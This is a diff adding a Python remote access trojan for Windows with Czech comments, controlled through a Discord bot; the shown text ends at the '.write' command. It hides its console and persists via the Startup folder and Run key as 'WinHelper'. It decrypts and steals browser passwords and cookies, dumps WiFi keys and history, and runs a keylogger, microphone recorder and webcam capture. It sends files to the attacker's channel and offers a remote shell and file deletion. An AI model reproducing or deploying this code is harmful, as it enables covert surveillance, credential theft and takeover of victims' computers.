@@ -1,0 +1,1165 @@
+# ================= [STEALTH] Skryti konzole =================
+import ctypes
+import os
+import sys
+
+if sys.platform == "win32":
+    try:
+        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hwnd:
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+        ctypes.windll.kernel32.FreeConsole()
+    except Exception:
+        pass
+try:
+    if sys.stdout is None:
+        sys.stdout = open(os.devnull, "w")
+    if sys.stderr is None:
+        sys.stderr = open(os.devnull, "w")
+except Exception:
+    pass
+# ============================================================
+
+import os
+import re
+import io
+import sys
+import csv
+import glob
+import time
+import json
+import shutil
+import ctypes
+import base64
+import hashlib
+import sqlite3
+import platform
+import getpass
+import subprocess
+import threading
+import webbrowser
+import datetime
+import asyncio
+
+import discord
+from discord.ext import commands
+
+from ctypes import wintypes
+
+# ================= KONFIGURACE =================
+BOT_TOKEN  = "tvuj_discord_bot_token"
+GUILD_ID   = 123456789012345678
+CHANNEL_ID = 987654321098765432
+
+TEMP = os.environ.get("TEMP", r"C:\Windows\Temp")
+CREATE_NO_WINDOW = 0x08000000
+CURRENT_DIR = os.getcwd()
+SELECTED_CAM = 0
+
+SELF_DESTRUCT_ARMED = False
+SELF_DESTRUCT_DEADLINE = 0
+# ===============================================
+
+BROWSERS = [
+    ("Chrome", r"Google\Chrome\User Data"),
+    ("Edge",   r"Microsoft\Edge\User Data"),
+    ("Brave",  r"BraveSoftware\Brave-Browser\User Data"),
+]
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)
+
+# ---------------- Pomocne ----------------
+
+def run_hidden(cmd, timeout=120, cwd=None, shell=False):
+    try:
+        p = subprocess.run(cmd, capture_output=True, text=True,
+                           timeout=timeout, cwd=cwd or CURRENT_DIR,
+                           shell=shell, creationflags=CREATE_NO_WINDOW)
+        out = (p.stdout or "") + (p.stderr or "")
+        return out.strip() if out.strip() else "[OK - zadny vystup]"
+    except subprocess.TimeoutExpired:
+        return "[Timeout]"
+    except Exception as e:
+        return f"[Chyba] {e}"
+
+def ps(script, timeout=60):
+    return run_hidden(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
+                       "-Command", script], timeout=timeout)
+
+# ---------------- Screenshot ----------------
+
+def screenshot(path):
+    ps("Add-Type -AssemblyName System.Windows.Forms;"
+       "Add-Type -AssemblyName System.Drawing;"
+       "$b = New-Object System.Drawing.Bitmap("
+       "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
+       "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
+       "$g = [System.Drawing.Graphics]::FromImage($b);"
+       "$g.CopyFromScreen(0,0,0,0,$b.Size);"
+       f'$b.Save("{path}");', timeout=30)
+    return os.path.isfile(path)
+
+# ---------------- Kamera ----------------
+
+def get_cameras():
+    cams = []
+    try:
+        from pygrabber.dshow_graph import FilterGraph
+        cams = FilterGraph().get_input_devices()
+    except Exception:
+        pass
+    if not cams:
+        try:
+            import cv2
+            for i in range(5):
+                cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
+                if cap.isOpened():
+                    cams.append(f"Kamera {i}")
+                    cap.release()
+        except Exception:
+            pass
+    return cams
+
+def webcam_pic(idx, path):
+    try:
+        import cv2
+        cap = cv2.VideoCapture(idx, cv2.CAP_DSHOW)
+        if not cap.isOpened():
+            return False
+        time.sleep(1.0)
+        ret, frame = cap.read()
+        cap.release()
+        if not ret or frame is None:
+            return False
+        cv2.imwrite(path, frame)
+        return os.path.isfile(path)
+    except Exception:
+        return False
+
+# ---------------- Idle / wallpaper / clipboard / msgbox / voice ----------------
+
+class LASTINPUTINFO(ctypes.Structure):
+    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
+
+def idle_time():
+    lii = LASTINPUTINFO()
+    lii.cbSize = ctypes.sizeof(lii)
+    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
+    s = (ctypes.windll.kernel32.GetTickCount64() - lii.dwTime) // 1000
+    return f"{s // 3600} h {s % 3600 // 60} min {s % 60} s"
+
+SPI_SETDESKWALLPAPER = 20
+def set_wallpaper(path):
+    return bool(ctypes.windll.user32.SystemParametersInfoW(
+        SPI_SETDESKWALLPAPER, 0, path, 3))
+
+def get_clipboard():
+    return ps("Get-Clipboard | Out-String", timeout=15)
+
+def msgbox(text):
+    ctypes.windll.user32.MessageBoxW(0, text, "Zprava", 0x40)
+
+def speak(text):
+    safe = text.replace("'", "''")
+    ps(f"Add-Type -AssemblyName System.Speech;"
+       f"$s = New-Object System.Speech.Synthesis.SpeechSynthesizer;"
+       f"$s.Speak('{safe}');", timeout=60)
+
+def type_text(text):
+    safe = text.replace("{", "{{").replace("}", "}}").replace("+", "{+}") \
+               .replace("^", "{^}").replace("%", "{%}").replace("~", "{~}") \
+               .replace("(", "{(}").replace(")", "{)}").replace("\n", "~")
+    ps(f"$w = New-Object -ComObject WScript.Shell; $w.SendKeys('{safe}')",
+       timeout=20)
+
+def play_audio(path):
+    try:
+        mci = ctypes.windll.winmm.mciSendStringW
+        mci(f'open "{path}" alias soundfile', None, 0, 0)
+        mci("play soundfile wait", None, 0, 0)
+        mci("close soundfile", None, 0, 0)
+        return True
+    except Exception:
+        return False
+
+def fake_bsod():
+    def _run():
+        try:
+            import tkinter as tk
+            root = tk.Tk()
+            root.attributes("-fullscreen", True)
+            root.configure(bg="#0078D7")
+            root.attributes("-topmost", True)
+            lbl = tk.Label(root, fg="white", bg="#0078D7",
+                           font=("Segoe UI", 22), justify="left")
+            lbl.pack(expand=True, padx=80, anchor="w")
+            pct = {"v": 0}
+            def tick():
+                pct["v"] += 1
+                if pct["v"] > 100:
+                    root.destroy(); return
+                lbl.config(text=":(\n\nYour PC ran into a problem and needs to restart.\n"
+                                "We're just collecting some error info.\n\n"
+                                f"{pct['v']}% complete")
+                root.after(120, tick)
+            root.after(120, tick)
+            root.mainloop()
+        except Exception:
+            pass
+    threading.Thread(target=_run, daemon=True).start()
+
+# ---------------- Persistence ----------------
+
+def add_startup():
+    try:
+        dest_dir = os.path.join(os.getenv("APPDATA", ""), "WinHelper")
+        os.makedirs(dest_dir, exist_ok=True)
+        dest = os.path.join(dest_dir, os.path.basename(sys.argv[0]))
+        src = os.path.abspath(sys.argv[0])
+        if os.path.normpath(src).lower() != os.path.normpath(dest).lower():
+            shutil.copy2(src, dest)
+        launcher = os.path.join(dest_dir, "WinHelper.vbs")
+        if dest.lower().endswith((".py", ".pyw")):
+            pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
+            if not os.path.isfile(pyw):
+                pyw = sys.executable
+            with open(launcher, "w", encoding="utf-8") as f:
+                f.write('Set s = CreateObject("WScript.Shell")\n'
+                        f's.Run """{pyw}"" "{dest}"", 0, False\n')
+        else:
+            with open(launcher, "w", encoding="utf-8") as f:
+                f.write(f'CreateObject("WScript.Shell").Run """{dest}""", 0, False\n')
+        startup = os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows",
+                               "Start Menu", "Programs", "Startup")
+        os.makedirs(startup, exist_ok=True)
+        shutil.copy2(launcher, os.path.join(startup, "WinHelper.vbs"))
+        import winreg
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                           r"Software\Microsoft\Windows\CurrentVersion\Run",
+                           0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "WinHelper", 0, winreg.REG_SZ,
+                          f'wscript.exe "{launcher}"')
+        winreg.CloseKey(k)
+        return True
+    except Exception:
+        return False
+
+def do_self_destruct():
+    try:
+        keylogger.stop()
+        recorder.stop()
+    except Exception:
+        pass
+    try:
+        for folder in (os.path.join(os.getenv("APPDATA", ""), "WinHelper"),
+                       os.path.join(os.getenv("APPDATA", ""), "Microsoft",
+                                    "Windows", "Start Menu", "Programs",
+                                    "Startup")):
+            if os.path.isdir(folder):
+                for f in os.listdir(folder):
+                    if "winhelper" in f.lower():
+                        try:
+                            os.remove(os.path.join(folder, f))
+                        except Exception:
+                            pass
+        import winreg
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                           r"Software\Microsoft\Windows\CurrentVersion\Run",
+                           0, winreg.KEY_SET_VALUE)
+        try:
+            winreg.DeleteValue(k, "WinHelper")
+        except Exception:
+            pass
+        winreg.CloseKey(k)
+    except Exception:
+        pass
+    try:
+        for f in glob.glob(os.path.join(TEMP, "winhelper_*")) + \
+                 glob.glob(os.path.join(TEMP, "syshelper_*")):
+            try:
+                os.remove(f)
+            except Exception:
+                pass
+    except Exception:
+        pass
+    os._exit(0)
+
+# ---------------- Geolokace ----------------
+
+def geolocate():
+    try:
+        import requests as rq
+        ip = rq.get("https://api.ipify.org", timeout=10).text
+        geo = rq.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
+        return (f"IP: {ip} | {geo.get('country','?')}, {geo.get('city','?')}\n"
+                f"ISP: {geo.get('isp','?')}\n"
+                f"GPS: https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')}")
+    except Exception as e:
+        return f"[Chyba] {e}"
+
+# ---------------- [z Telegram buildu] Info ----------------
+
+def get_info():
+    lines = []
+    try:
+        lines.append(f"Uzivatel : {getpass.getuser()}")
+        lines.append(f"Pocitac  : {platform.node()}")
+        lines.append(f"OS       : {platform.system()} {platform.release()} ({platform.version()})")
+        lines.append(f"Arch     : {platform.machine()}")
+        uptime_s = ctypes.windll.kernel32.GetTickCount64() // 1000
+        lines.append(f"Uptime   : {uptime_s // 3600} h {uptime_s % 3600 // 60} min")
+        import winreg
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                               r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
+            lines.append(f"CPU      : {winreg.QueryValueEx(k, 'ProcessorNameString')[0].strip()}")
+        except Exception:
+            lines.append(f"CPU      : {platform.processor()}")
+        class MEMORYSTATUSEX(ctypes.Structure):
+            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
+                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
+                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
+                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
+                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
+        m = MEMORYSTATUSEX(); m.dwLength = ctypes.sizeof(m)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
+        lines.append(f"RAM      : {m.ullTotalPhys / 1024**3:.1f} GB")
+        gpu = ps("(Get-CimInstance Win32_VideoController).Name", timeout=30)
+        lines.append(f"GPU      : {gpu.splitlines()[0] if gpu else 'N/A'}")
+        usage = shutil.disk_usage(os.environ.get("SystemDrive", "C:\\"))
+        lines.append(f"Disk C:  : {usage.total / 1024**3:.0f} GB (volno {usage.free / 1024**3:.0f} GB)")
+        try:
+            import winreg
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
+            lines.append(f"HWID     : {winreg.QueryValueEx(k, 'MachineGuid')[0]}")
+        except Exception:
+            pass
+        lines.append(f"IP       : {geolocate().splitlines()[0] if geolocate() else 'N/A'}")
+        av = ps("(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName",
+                timeout=30)
+        lines.append(f"AV       : {av or 'N/A'}")
+    except Exception as e:
+        lines.append(f"Chyba: {e}")
+    return "\n".join(lines)
+
+# ---------------- [z Telegram buildu] WiFi ----------------
+
+def dump_wifi():
+    try:
+        out = subprocess.run(["netsh", "wlan", "show", "profiles"],
+                             capture_output=True, text=True,
+                             creationflags=CREATE_NO_WINDOW).stdout
+    except Exception as e:
+        return f"[Chyba] {e}"
+    names = re.findall(r"^\s*(?:All User Profile|Profil všech uživatelů)\s*:\s*(.+?)\s*$",
+                       out, re.M | re.I)
+    if not names:
+        return "[?] Zadne WiFi profily."
+    lines = []
+    for name in names:
+        try:
+            p = subprocess.run(["netsh", "wlan", "show", "profile",
+                                f'name="{name}"', "key=clear"],
+                               capture_output=True, text=True,
+                               creationflags=CREATE_NO_WINDOW).stdout
+            m = re.search(r"(?:Key Content|Obsah klíče)\s*:\s*(.+)", p, re.M | re.I)
+            pwd = m.group(1).strip() if m else "(prazdne / potreba admin)"
+        except Exception:
+            pwd = "(chyba cteni)"
+        lines.append(f"{name} : {pwd}")
+    return "\n".join(lines)
+
+# ---------------- [z Telegram buildu] Sifrovani prohlizecu ----------------
+
+class DATA_BLOB(ctypes.Structure):
+    _fields_ = [("cbData", ctypes.c_ulong),
+                ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+def dpapi_unprotect(blob):
+    if not blob:
+        return None
+    buf = ctypes.create_string_buffer(blob, len(blob))
+    din = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
+    dout = DATA_BLOB()
+    if ctypes.windll.crypt32.CryptUnprotectData(
+            ctypes.byref(din), None, None, None, None, 0, ctypes.byref(dout)):
+        data = ctypes.string_at(dout.pbData, dout.cbData)
+        ctypes.windll.kernel32.LocalFree(dout.pbData)
+        return data
+    return None
+
+def get_master_key(local_state_path):
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        ls = json.load(f)
+    enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
+    return dpapi_unprotect(enc)
+
+def decrypt_password(enc_value, key):
+    if not enc_value:
+        return ""
+    if enc_value[:3] in (b"v10", b"v11"):
+        from Crypto.Cipher import AES
+        nonce, tag = enc_value[3:15], enc_value[-16:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(enc_value[15:-16], tag).decode("utf-8", "ignore")
+    if enc_value[:3] == b"v20":
+        return "[v20 - app-bound, nelze]"
+    blob = dpapi_unprotect(enc_value)
+    return blob.decode("utf-8", "ignore") if blob else ""
+
+def decrypt_cookie(enc_value, key):
+    if not enc_value:
+        return ""
+    if enc_value[:3] in (b"v10", b"v11"):
+        from Crypto.Cipher import AES
+        iv = enc_value[3:15]
+        cipher = AES.new(hashlib.sha256(key + b"cookies").digest()[:16],
+                         AES.MODE_CBC, iv=iv)
+        pad = cipher.decrypt(enc_value[15:])
+        try:
+            if pad and 0 < pad[-1] < 16 and pad[-pad[-1]:] == pad[-1:] * pad[-1]:
+                pad = pad[:-pad[-1]]
+            else:
+                pad = pad.rstrip(b"\x00")
+        except Exception:
+            pass
+        return pad.decode("utf-8", "ignore")
+    if enc_value[:3] == b"v20":
+        return "[v20 - nelze]"
+    blob = dpapi_unprotect(enc_value)
+    return blob.decode("utf-8", "ignore") if blob else ""
+
+def copy_db(path):
+    tmp = os.path.join(TEMP, f"winhelper_{int(time.time()*1000)}_{os.getpid()}.db")
+    shutil.copy2(path, tmp)
+    return tmp
+
+def browser_profiles(base):
+    if not os.path.isdir(base):
+        return []
+    profs = [d for d in os.listdir(base)
+             if d == "Default" or d.startswith("Profile")]
+    return profs or ["Default"]
+
+def dump_passwords():
+    lines, total = [], 0
+    for name, rel in BROWSERS:
+        base = os.path.join(os.getenv("LOCALAPPDATA", ""), rel)
+        if not os.path.isdir(base):
+            continue
+        local_state = os.path.join(base, "Local State")
+        if not os.path.isfile(local_state):
+            continue
+        try:
+            key = get_master_key(local_state)
+        except Exception:
+            continue
+        for prof in browser_profiles(base):
+            login_db = os.path.join(base, prof, "Login Data")
+            if not os.path.isfile(login_db):
+                continue
+            try:
+                tmp = copy_db(login_db)
+                con = sqlite3.connect(tmp)
+                rows = con.execute(
+                    "SELECT origin_url, username_value, password_value FROM logins").fetchall()
+                con.close()
+                os.remove(tmp)
+            except Exception:
+                continue
+            found = 0
+            for url, user, pwd_enc in rows:
+                if not user and not pwd_enc:
+                    continue
+                try:
+                    pwd = decrypt_password(pwd_enc, key)
+                except Exception:
+                    pwd = "[nelze desifrovat]"
+                lines.append(f"{url} | {user} | {pwd}")
+                found += 1
+            total += found
+            lines.insert(0, f"--- {name} ({prof}): {found} ---")
+    if not any("--- " in l for l in lines):
+        return "[?] Chrome/Edge/Brave nenalezeny."
+    lines.append(f"CELKEM: {total}")
+    out = "\n".join(lines)
+    p = os.path.join(TEMP, "winhelper_passwords.txt")
+    with open(p, "w", encoding="utf-8") as f:
+        f.write(out)
+    return (f"[OK] {total} hesiel", p)   # vzdy jako soubor
+
+def dump_cookies():
+    lines, total = [], 0
+    for name, rel in BROWSERS:
+        base = os.path.join(os.getenv("LOCALAPPDATA", ""), rel)
+        if not os.path.isdir(base):
+            continue
+        local_state = os.path.join(base, "Local State")
+        if not os.path.isfile(local_state):
+            continue
+        try:
+            key = get_master_key(local_state)
+        except Exception:
+            continue
+        for prof in browser_profiles(base):
+            cookie_db = None
+            for cand in (os.path.join(base, prof, "Network", "Cookies"),
+                         os.path.join(base, prof, "Cookies")):
+                if os.path.isfile(cand):
+                    cookie_db = cand
+                    break
+            if not cookie_db:
+                continue
+            try:
+                tmp = copy_db(cookie_db)
+                con = sqlite3.connect(tmp)
+                rows = con.execute(
+                    "SELECT host_key, name, encrypted_value FROM cookies").fetchall()
+                con.close()
+                os.remove(tmp)
+            except Exception:
+                continue
+            found = 0
+            for host, cname, cval_enc in rows:
+                if not cval_enc:
+                    continue
+                try:
+                    val = decrypt_cookie(cval_enc, key)
+                except Exception:
+                    val = "[nelze desifrovat]"
+                if val.startswith("[v20"):
+                    continue
+                lines.append(f"{host}\t{cname}\t{val}")
+                found += 1
+            total += found
+            lines.insert(0, f"--- {name} ({prof}): {found} ---")
+    if not any("--- " in l for l in lines):
+        return "[?] Cookies nenalezeny."
+    out = "\n".join(lines)
+    p = os.path.join(TEMP, "winhelper_cookies.txt")
+    with open(p, "w", encoding="utf-8") as f:
+        f.write(out)
+    return (f"[OK] {total} cookies", p)
+
+# ---------------- [z Telegram buildu] Windows klic ----------------
+
+def decode_product_key(dpid):
+    key = bytearray(dpid)[52:67]
+    key[14] &= 0xF7
+    chars = "BCDFGHJKMPQRTVWXY2346789"
+    pk = ""
+    for i in range(24, -1, -1):
+        cur = 0
+        for j in range(14, -1, -1):
+            cur = cur * 256 + key[j]
+            key[j] = cur // 24
+            cur %= 24
+        pk = chars[cur] + pk
+    return "-".join([pk[1:6], pk[6:11], pk[11:16], pk[16:21], pk[21:26]])
+
+def get_windows_key():
+    lines = []
+    import winreg
+    for sub, label in (("DigitalProductId", "Klic (instalace)"),
+                       ("DigitalProductId4", "Klic (OA3/OEM)")):
+        try:
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                               r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
+            val, _ = winreg.QueryValueEx(k, sub)
+            lines.append(f"{label}: {decode_product_key(val)}")
+        except Exception as e:
+            lines.append(f"{label}: N/A ({e})")
+    return "\n".join(lines)
+
+# ---------------- [z Telegram buildu] Historie ----------------
+
+def chrome_time(us):
+    try:
+        return datetime.datetime.utcfromtimestamp(
+            us / 1_000_000 - 11644473600).strftime("%Y-%m-%d %H:%M")
+    except Exception:
+        return "?"
+
+def dump_history(n=20):
+    n = max(1, min(n, 200))
+    lines = []
+    for name, rel in BROWSERS:
+        base = os.path.join(os.getenv("LOCALAPPDATA", ""), rel)
+        if not os.path.isdir(base):
+            continue
+        for prof in browser_profiles(base):
+            hist_db = os.path.join(base, prof, "History")
+            if not os.path.isfile(hist_db):
+                continue
+            try:
+                tmp = copy_db(hist_db)
+                con = sqlite3.connect(tmp)
+                rows = con.execute(
+                    "SELECT url, title, last_visit_time FROM urls "
+                    "WHERE last_visit_time > 0 "
+                    "ORDER BY last_visit_time DESC LIMIT ?", (n,)).fetchall()
+                con.close()
+                os.remove(tmp)
+            except Exception:
+                continue
+            lines.append(f"=== {name} ({prof}) ===")
+            for url, title, t in rows:
+                lines.append(f"[{chrome_time(t)}] {url} | {title or ''}")
+    if not lines:
+        return "[?] Historie nenalezena."
+    out = "\n".join(lines)
+    if len(out) <= 1800:
+        return out
+    p = os.path.join(TEMP, "winhelper_history.txt")
+    with open(p, "w", encoding="utf-8") as f:
+        f.write(out)
+    return ("[OK] Historie", p)
+
+# ---------------- [z Telegram buildu] Mikrofon ----------------
+
+class MicRecorder:
+    def __init__(self):
+        self.stop_evt = threading.Event()
+        self.thread = None
+
+    def is_running(self):
+        return bool(self.thread and self.thread.is_alive())
+
+    def start(self):
+        if self.is_running():
+            return "[OK] Uz nahravam."
+        self.stop_evt.clear()
+        self.thread = threading.Thread(target=self._loop, daemon=True)
+        self.thread.start()
+        return "[OK] Nahravani spusteno - WAV segmenty ukladam do TEMP."
+
+    def stop(self):
+        if not self.is_running():
+            return "[OK] Nahravani nebezi."
+        self.stop_evt.set()
+        self.thread.join(timeout=8)
+        return "[OK] Nahravani zastaveno. Posledni segment: .download <cesta z TEMP>"
+
+    def _loop(self):
+        try:
+            import pyaudio
+            import wave
+        except Exception:
+            return
+        try:
+            p = pyaudio.PyAudio()
+        except Exception:
+            return
+        rate, chunk = 16000, 4096
+        try:
+            while not self.stop_evt.is_set():
+                try:
+                    stream = p.open(format=pyaudio.paInt16, channels=1,
+                                    rate=rate, input=True,
+                                    frames_per_buffer=chunk)
+                except Exception:
+                    return
+                frames, collected, target = [], 0, rate * 120
+                while collected < target and not self.stop_evt.is_set():
+                    try:
+                        data = stream.read(chunk, exception_on_overflow=False)
+                    except Exception:
+                        break
+                    frames.append(data)
+                    collected += len(data) // 2
+                stream.stop_stream()
+                stream.close()
+                if frames and not self.stop_evt.is_set():
+                    tmp = os.path.join(TEMP, f"winhelper_rec_{int(time.time())}.wav")
+                    wf = wave.open(tmp, "wb")
+                    wf.setnchannels(1)
+                    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
+                    wf.setframerate(rate)
+                    wf.writeframes(b"".join(frames))
+                    wf.close()
+        finally:
+            p.terminate()
+
+recorder = MicRecorder()
+
+# ---------------- [z Telegram buildu] Keylogger ----------------
+
+class Keylogger:
+    def __init__(self):
+        self.running = False
+        self.thread = None
+        self.log_path = os.path.join(TEMP, "winhelper_keys.txt")
+
+    def is_running(self):
+        return bool(self.thread and self.thread.is_alive())
+
+    def start(self):
+        if self.is_running():
+            return "[OK] Keylogger uz bezi."
+        self.running = True
+        self.thread = threading.Thread(target=self._loop, daemon=True)
+        self.thread.start()
+        return f"[OK] Keylogger spusten. Log: {self.log_path} (stahuj pres .download)"
+
+    def stop(self):
+        if not self.is_running():
+            return "[OK] Keylogger nebezi."
+        self.running = False
+        self.thread.join(timeout=8)
+        return f"[OK] Keylogger zastaven. Log: {self.log_path}"
+
+    def _loop(self):
+        user32 = ctypes.windll.user32
+        special = {
+            0x08: "[BKSP]", 0x09: "[TAB]", 0x0D: "\n", 0x1B: "[ESC]",
+            0x20: " ", 0x2E: "[DEL]",
+            0xA0: "[SHIFT]", 0xA1: "[SHIFT]", 0xA2: "[CTRL]", 0xA3: "[CTRL]",
+            0xA4: "[ALT]", 0xA5: "[ALT]", 0x5B: "[WIN]", 0x5C: "[WIN]",
+        }
+        fh = None
+        try:
+            fh = open(self.log_path, "a", encoding="utf-8", errors="ignore")
+            while self.running:
+                for code in range(8, 256):
+                    try:
+                        if user32.GetAsyncKeyState(code) & 1:
+                            if code in special:
+                                ch = special[code]
+                            elif 0x30 <= code <= 0x39:
+                                ch = chr(code)
+                            elif 0x41 <= code <= 0x5A:
+                                ch = chr(code)
+                            elif 0x60 <= code <= 0x69:
+                                ch = chr(code - 0x30)
+                            else:
+                                continue
+                            fh.write(ch)
+                            fh.flush()
+                    except Exception:
+                        pass
+                time.sleep(0.01)
+        except Exception:
+            pass
+        finally:
+            if fh:
+                try:
+                    fh.close()
+                except Exception:
+                    pass
+
+keylogger = Keylogger()
+
+# ---------------- [z Telegram buildu] Procesy ----------------
+
+PROCS = []
+
+def show_processes():
+    global PROCS
+    out = run_hidden(
+        ["powershell", "-NoProfile", "-Command",
+         "Get-Process | Select-Object Id,ProcessName | ConvertTo-Csv -NoTypeInformation"],
+        timeout=60)
+    rows = [r for r in csv.reader(io.StringIO(out))]
+    if len(rows) < 2:
+        return "[?] Zadne procesy."
+    PROCS = [(r[1], r[0]) for r in rows[1:] if len(r) >= 2]
+    listing = "\n".join(f"{i}: {name} (PID {pid})"
+                        for i, (name, pid) in enumerate(PROCS))
+    if len(listing) <= 1800:
+        return listing
+    p = os.path.join(TEMP, "winhelper_procs.txt")
+    with open(p, "w", encoding="utf-8") as f:
+        f.write(listing)
+    return ("[OK] Seznam procesu", p)
+
+def kill_process(idx):
+    try:
+        i = int(idx)
+        if not (0 <= i < len(PROCS)):
+            return "[Chyba] Spatny index. Nejdřív .listprocess"
+        name, pid = PROCS[i]
+        run_hidden(["taskkill", "/F", "/PID", str(pid)])
+        return f"[OK] Zabit: {name} (PID {pid})"
+    except Exception as e:
+        return f"[Chyba] {e}"
+
+# ================= DISCORD BOT =================
+
+@bot.event
+async def on_ready():
+    ch = bot.get_channel(CHANNEL_ID)
+    if ch:
+        try:
+            await ch.send(f"[OK] Online - {getpass.getuser()}@{platform.node()} "
+                          f"({platform.system()} {platform.release()})")
+        except Exception:
+            pass
+
+@bot.event
+async def on_message(message):
+    global SELF_DESTRUCT_ARMED, SELF_DESTRUCT_DEADLINE
+    if message.author == bot.user:
+        return
+    if message.channel.id != CHANNEL_ID:
+        return
+    if not message.content.startswith("."):
+        return
+
+    # --- self-destruct potvrzeni YES/NO ---
+    if SELF_DESTRUCT_ARMED:
+        t = message.content.strip().upper()
+        if time.time() > SELF_DESTRUCT_DEADLINE:
+            SELF_DESTRUCT_ARMED = False
+            await message.channel.send("[OK] Self-destruct vyprsel - zruseno.")
+        elif t == "YES":
+            await message.channel.send("[OK] Odinstalovano.")
+            do_self_destruct()
+        elif t == "NO":
+            SELF_DESTRUCT_ARMED = False
+            await message.channel.send("[OK] Self-destruct zrusen.")
+        else:
+            await message.channel.send("[?] Napis YES nebo NO.")
+        return
+
+    def work():
+        return handle_command(message)
+
+    try:
+        result = await asyncio.get_event_loop().run_in_executor(None, work)
+        if isinstance(result, tuple):
+            text, fpath = result
+            if fpath and os.path.isfile(fpath):
+                await message.channel.send(content=(text[:1900] or None),
+                                           file=discord.File(fpath))
+                try:
+                    os.remove(fpath)
+                except Exception:
+                    pass
+            else:
+                await message.channel.send(text[:1900] or "[prazdny vystup]")
+        elif result:
+            for i in range(0, len(result), 1900):
+                await message.channel.send(result[i:i + 1900])
+    except Exception as e:
+        try:
+            await message.channel.send(f"[Chyba] {e}")
+        except Exception:
+            pass
+
+def handle_command(msg):
+    global CURRENT_DIR, SELECTED_CAM, SELF_DESTRUCT_ARMED, SELF_DESTRUCT_DEADLINE
+
+    text = msg.content
+    parts = text.split(" ", 1)
+    cmd  = parts[0].lower()
+    arg  = parts[1].strip() if len(parts) > 1 else ""
+    atts = list(msg.attachments)
+
+    # ---------- puvodni Discord set ----------
+    if cmd == ".message":
+        if not arg:
+            return "Pouziti: .message <text>"
+        threading.Thread(target=msgbox, args=(arg,), daemon=True).start()
+        return f"[OK] MessageBox: {arg}"
+
+    if cmd == ".shell" or cmd == ".cmd":
+        if not arg:
+            return "Pouziti: .shell <prikaz>"
+        return run_hidden(arg, shell=True)
+
+    if cmd == ".voice":
+        if not arg:
+            return "Pouziti: .voice <text>"
+        speak(arg)
+        return f"[OK] Precteno: {arg}"
+
+    if cmd == ".admincheck":
+        try:
+            admin = ctypes.windll.shell32.IsUserAnAdmin()
+        except Exception:
+            admin = 0
+        return "[OK] Admin" if admin else "[NO] Neni admin"
+
+    if cmd == ".cd":
+        if not arg:
+            return f"CWD: {CURRENT_DIR}"
+        try:
+            os.chdir(os.path.abspath(arg))
+            CURRENT_DIR = os.getcwd()
+            return f"[OK] CWD: {CURRENT_DIR}"
+        except Exception as e:
+            return f"[Chyba] {e}"
+
+    if cmd == ".dir" or cmd == ".ls":
+        try:
+            items = os.listdir(CURRENT_DIR)
+            if not items:
+                return "[prazdna slozka]"
+            out = []
+            for i in items:
+                p = os.path.join(CURRENT_DIR, i)
+                out.append(("[D] " if os.path.isdir(p) else "     ") + i)
+            return "\n".join(out)
+        except Exception as e:
+            return f"[Chyba] {e}"
+
+    if cmd == ".currentdir":
+        return f"CWD: {CURRENT_DIR}"
+
+    if cmd == ".download":
+        if not arg or not os.path.isfile(arg):
+            return f"[Chyba] Soubor nenalezen: {arg}"
+        return ("[OK] Posilam soubor", arg)
+
+    if cmd == ".upload":
+        if not atts:
+            return "Pouziti: .upload + priloha"
+        a = atts[0]
+        dest_dir = arg if arg and os.path.isdir(arg) else TEMP
+        dest = os.path.join(dest_dir, a.filename)
+        try:
+            import requests as rq
+            r = rq.get(a.url, timeout=120)
+            with open(dest, "wb") as f:
+                f.write(r.content)
+            return f"[OK] Ulozeno: {dest} ({len(r.content)} B)"
+        except Exception as e:
+            return f"[Chyba] {e}"
+
+    if cmd == ".uploadlink":
+        ap = arg.split(" ", 1)
+        if len(ap) < 2:
+            return "Pouziti: .uploadlink <url> <nazev>"
+        try:
+            import requests as rq
+            r = rq.get(ap[0], timeout=120)
+            dest = os.path.join(TEMP, ap[1])
+            with open(dest, "wb") as f:
+                f.write(r.content)
+            return f"[OK] Stazeno: {dest} ({len(r.content)} B)"
+        except Exception as e:
+            return f"[Chyba] {e}"
+
+    if cmd == ".delete":
+        if not arg:
+            return "Pouziti: .delete <cesta>"
+        try:
+            if os.path.isdir(arg):
+                shutil.rmtree(arg)
+                return f"[OK] Smazana slozka: {arg}"
+            os.remove(arg)
+            return f"[OK] Smazano: {arg}"
+        except Exception as e:
+            return f"[Chyba] {e}"
+
+    if cmd == ".write":
